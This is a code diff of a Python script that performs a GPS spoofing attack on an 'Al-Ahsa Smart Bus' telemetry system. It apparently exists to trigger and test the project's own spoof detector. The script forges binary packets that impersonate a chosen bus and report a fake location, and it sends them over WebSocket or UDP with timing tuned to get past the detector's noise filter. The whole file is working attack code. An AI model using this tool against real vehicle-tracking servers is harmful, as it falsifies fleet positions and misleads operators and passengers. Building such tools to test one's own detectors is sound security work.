@@ -1,28 +1,40 @@
 #!/usr/bin/env python3
-"""
-Al-Ahsa Smart Bus — GPS spoofing attack script.
+"""Al-Ahsa Smart Bus — GPS spoofing attack.
 
-Sends forged GPS telemetry packets that impersonate a given bus_id but
-report a fake position far from the real route.  Replicates the ns-3
-GpsSpoofAttackApp (smart-bus.cc lines 693-818).
+Sends forged GPS telemetry packets that impersonate a given ``bus_id``
+but report a fake position far from the real route. Two transports
+are supported:
 
-Packet wire format (little-endian, 200 bytes total):
+* **WebSocket (default for the internet build).** Pass ``--server-url``
+  with the public base URL (e.g. ``https://jetson.testingdomainz...``).
+  Frames go to ``/ingest/gps`` over WSS; the server-side GPS detector
+  picks them up and (after 3 consecutive anomalies) writes a
+  ``gps_spoof`` event into the dashboard.
+* **UDP (legacy LAN build).** Pass ``--target <host>`` instead. Packets
+  go to UDP port 5000 of a Jetson running the old local detector.
+
+Wire format (little-endian, 200 bytes total) is identical in both modes:
     [0..3]   uint32  magic   = 0x47505331 ("GPS1")
     [4..7]   uint32  bus_id
     [8..15]  double  pos_x
     [16..23] double  pos_y
-    [24..199] zeros  (padding)
+    [24..199] zeros
 
-Default fake position: (14000, 1000) — approximately 8 km from route 0,
-matching the ns-3 Vector fakePos(14000, 1000, 0) at line 1701.
+Default fake position: (14000, 1000) — ~6.5 km off route 0's corridor,
+which alone is enough to trigger the corridor anomaly on every packet.
 
-Default count: 30 packets at 1 pkt/s, matching ns-3 numPackets=30 and
-interval=1.0 (lines 734, 1705).
+The server-side detector is one-shot per ``bus_id``. To re-test after a
+trigger, spoof a different bus_id or restart the server.
 
-Usage:
-    python gps_spoof.py --target 192.168.1.100 --bus-id 0
-    python gps_spoof.py --target 192.168.1.100 --bus-id 0 --fake-x 14000 --fake-y 1000 --count 30
+Examples:
+    # Internet build (server-side detector):
+    python gps_spoof.py --server-url https://jetson.testingdomainzforprototypes.website --bus-id 1
+
+    # LAN build (legacy local detector on a Jetson):
+    python gps_spoof.py --target 192.168.3.199 --bus-id 0
 """
+
+from __future__ import annotations
 
 import argparse
 import logging
@@ -34,124 +46,185 @@ import time
 
 logger = logging.getLogger(__name__)
 
-# Constants matching ns-3
-GPS_PAYLOAD_MAGIC = 0x47505331   # "GPS1"
-PACKET_SIZE = 200                # smart-bus.cc line 471/785
-SEND_INTERVAL = 1.0             # 1 packet per second
-DEFAULT_PORT = 5000              # TELEMETRY_PORT
-
-# Header format: magic(4) + bus_id(4) + pos_x(8) + pos_y(8) = 24 bytes
+GPS_PAYLOAD_MAGIC = 0x47505331
+PACKET_SIZE = 200
+DEFAULT_INTERVAL = 0.6        # > 0.5 s noise floor on the detector
+DEFAULT_PORT = 5000
+DEFAULT_COUNT = 8             # 8 * 0.6 s ≈ 5 s, enough for a 3-streak
 _HEADER_FMT = "<IIdd"
-_HEADER_SIZE = struct.calcsize(_HEADER_FMT)  # 24
+_HEADER_SIZE = struct.calcsize(_HEADER_FMT)
 
 
 def build_gps_packet(bus_id: int, pos_x: float, pos_y: float) -> bytes:
-    """Build a 200-byte GPS telemetry packet with spoofed coordinates."""
     header = struct.pack(_HEADER_FMT, GPS_PAYLOAD_MAGIC, bus_id, pos_x, pos_y)
-    padding = b"\x00" * (PACKET_SIZE - _HEADER_SIZE)
-    return header + padding
+    return header + b"\x00" * (PACKET_SIZE - _HEADER_SIZE)
 
 
-def run_spoof(target: str, port: int, bus_id: int,
-              fake_x: float, fake_y: float, count: int) -> None:
-    """Send *count* spoofed GPS packets to the target."""
+# ---------------------------------------------------------------------------
+# Sender — UDP legacy
+# ---------------------------------------------------------------------------
 
+def run_spoof_udp(
+    target: str, port: int, bus_id: int,
+    fake_x: float, fake_y: float, count: int, interval: float,
+    stop_flag: list,
+) -> int:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    # Graceful shutdown
-    running = True
-
-    def _signal_handler(signum, frame):
-        nonlocal running
-        running = False
-
-    signal.signal(signal.SIGINT, _signal_handler)
-    signal.signal(signal.SIGTERM, _signal_handler)
-
     logger.info(
-        "GPS spoof starting -> %s:%d  bus_id=%d  fake=(%g, %g)  count=%d",
+        "GPS spoof (UDP) -> %s:%d  bus_id=%d  fake=(%g, %g)  count=%d",
         target, port, bus_id, fake_x, fake_y, count,
     )
-
-    total_sent = 0
-
+    sent = 0
     try:
         for seq in range(count):
-            if not running:
+            if stop_flag[0]:
                 break
-
             packet = build_gps_packet(bus_id, fake_x, fake_y)
-
             try:
                 sock.sendto(packet, (target, port))
-                total_sent += 1
-                print(
-                    f"[{seq + 1:3d}/{count}]  bus_id={bus_id}  "
-                    f"pos=({fake_x:g}, {fake_y:g})  "
-                    f"-> {target}:{port}"
-                )
+                sent += 1
+                print(f"[{seq + 1:3d}/{count}]  bus_id={bus_id}  "
+                      f"pos=({fake_x:g}, {fake_y:g})  -> udp://{target}:{port}")
             except OSError as exc:
-                logger.warning("Send error on pkt %d: %s", seq + 1, exc)
-
-            # Wait 1 second between packets (matching ns-3 interval=1.0)
-            if seq < count - 1 and running:
-                deadline = time.monotonic() + SEND_INTERVAL
-                while time.monotonic() < deadline and running:
-                    remaining = deadline - time.monotonic()
-                    if remaining > 0.05:
-                        time.sleep(0.05)
-
+                logger.warning("send error on pkt %d: %s", seq + 1, exc)
+            if seq < count - 1 and not stop_flag[0]:
+                _sleep(interval, stop_flag)
     finally:
         sock.close()
-        print(
-            f"\nGPS spoof finished.  Sent {total_sent}/{count} packets "
-            f"for bus_id={bus_id} to {target}:{port}"
-        )
+    return sent
 
 
-def main():
-    parser = argparse.ArgumentParser(
-        description="Al-Ahsa Smart Bus — GPS spoofing attack"
+# ---------------------------------------------------------------------------
+# Sender — WebSocket (internet build)
+# ---------------------------------------------------------------------------
+
+def _to_ws_url(server_url: str) -> str:
+    base = server_url.rstrip("/")
+    if base.startswith("https://"):
+        base = "wss://" + base[len("https://"):]
+    elif base.startswith("http://"):
+        base = "ws://" + base[len("http://"):]
+    return base + "/ingest/gps"
+
+
+def run_spoof_ws(
+    server_url: str, bus_id: int, fake_x: float, fake_y: float,
+    count: int, interval: float, stop_flag: list,
+) -> int:
+    try:
+        import websocket  # from `pip install websocket-client`
+    except ImportError:
+        sys.stderr.write("ERROR: missing dependency. Run: pip install websocket-client\n")
+        sys.exit(1)
+
+    url = _to_ws_url(server_url)
+    logger.info(
+        "GPS spoof (WSS) -> %s  bus_id=%d  fake=(%g, %g)  count=%d  interval=%.2fs",
+        url, bus_id, fake_x, fake_y, count, interval,
     )
-    parser.add_argument(
-        "--target", required=True,
-        help="Target IP address (server receiving GPS telemetry)"
+    try:
+        ws = websocket.create_connection(url, timeout=10)
+    except Exception as exc:
+        sys.stderr.write(f"ERROR: could not connect to {url}: {exc}\n")
+        sys.exit(2)
+
+    sent = 0
+    try:
+        for seq in range(count):
+            if stop_flag[0]:
+                break
+            packet = build_gps_packet(bus_id, fake_x, fake_y)
+            try:
+                ws.send_binary(packet)
+                sent += 1
+                print(f"[{seq + 1:3d}/{count}]  bus_id={bus_id}  "
+                      f"pos=({fake_x:g}, {fake_y:g})  -> {url}")
+            except Exception as exc:
+                logger.warning("WS send error on pkt %d: %s", seq + 1, exc)
+                break
+            if seq < count - 1 and not stop_flag[0]:
+                _sleep(interval, stop_flag)
+    finally:
+        try:
+            ws.close()
+        except Exception:
+            pass
+    return sent
+
+
+def _sleep(duration: float, stop_flag: list) -> None:
+    deadline = time.monotonic() + duration
+    while time.monotonic() < deadline and not stop_flag[0]:
+        time.sleep(min(0.05, deadline - time.monotonic()))
+
+
+# ---------------------------------------------------------------------------
+# CLI
+# ---------------------------------------------------------------------------
+
+def main() -> None:
+    p = argparse.ArgumentParser(
+        description="Al-Ahsa Smart Bus — GPS spoofing attack",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument(
-        "--bus-id", type=int, default=0,
-        help="Bus ID to impersonate (default: 0)"
+    transport = p.add_mutually_exclusive_group(required=True)
+    transport.add_argument(
+        "--server-url",
+        help="Public server base URL (e.g. https://jetson.example.com). "
+             "Sends WSS frames to /ingest/gps. Use this for the internet build."
     )
-    parser.add_argument(
-        "--fake-x", type=float, default=14000.0,
-        help="Fake X coordinate in meters (default: 14000, ~8km from route 0)"
+    transport.add_argument(
+        "--target",
+        help="Target IP for legacy UDP mode (LAN build only).",
     )
-    parser.add_argument(
-        "--fake-y", type=float, default=1000.0,
-        help="Fake Y coordinate in meters (default: 1000)"
-    )
-    parser.add_argument(
-        "--count", type=int, default=30,
-        help="Number of spoofed packets to send (default: 30, matching ns-3)"
-    )
-    parser.add_argument(
-        "--port", type=int, default=DEFAULT_PORT,
-        help="Target UDP port (default: 5000 = TELEMETRY_PORT)"
-    )
-    parser.add_argument(
-        "--verbose", "-v", action="store_true",
-        help="Enable debug logging"
-    )
-    args = parser.parse_args()
+    p.add_argument("--bus-id", type=int, default=1,
+                   help="Bus ID to impersonate (default 1; avoid the bus_id "
+                        "your Jetson is actually sending so the streak builds).")
+    p.add_argument("--fake-x", type=float, default=14000.0,
+                   help="Fake X coordinate in meters (default 14000)")
+    p.add_argument("--fake-y", type=float, default=1000.0,
+                   help="Fake Y coordinate in meters (default 1000)")
+    p.add_argument("--count", type=int, default=DEFAULT_COUNT,
+                   help=f"Number of spoofed packets (default {DEFAULT_COUNT})")
+    p.add_argument("--interval", type=float, default=DEFAULT_INTERVAL,
+                   help=f"Seconds between packets (default {DEFAULT_INTERVAL}; "
+                        "must be >= 0.5 to clear the detector's noise filter)")
+    p.add_argument("--port", type=int, default=DEFAULT_PORT,
+                   help="UDP port (legacy mode only; default 5000)")
+    p.add_argument("--verbose", "-v", action="store_true")
+    args = p.parse_args()
 
     logging.basicConfig(
         level=logging.DEBUG if args.verbose else logging.INFO,
         format="%(asctime)s [%(levelname)s] %(message)s",
     )
 
-    run_spoof(
-        args.target, args.port, args.bus_id,
-        args.fake_x, args.fake_y, args.count,
-    )
+    if args.interval < 0.5:
+        logger.warning("--interval %.2f is below the detector's 0.5 s noise floor; "
+                       "the server will silently drop these packets.", args.interval)
+
+    stop_flag = [False]
+
+    def _signal_handler(signum, frame):
+        stop_flag[0] = True
+    signal.signal(signal.SIGINT, _signal_handler)
+    signal.signal(signal.SIGTERM, _signal_handler)
+
+    if args.server_url:
+        sent = run_spoof_ws(
+            args.server_url, args.bus_id, args.fake_x, args.fake_y,
+            args.count, args.interval, stop_flag,
+        )
+        target_str = args.server_url
+    else:
+        sent = run_spoof_udp(
+            args.target, args.port, args.bus_id, args.fake_x, args.fake_y,
+            args.count, args.interval, stop_flag,
+        )
+        target_str = f"{args.target}:{args.port}"
+
+    print(f"\nGPS spoof finished. Sent {sent}/{args.count} packets "
+          f"for bus_id={args.bus_id} to {target_str}")
 
 
 if __name__ == "__main__":
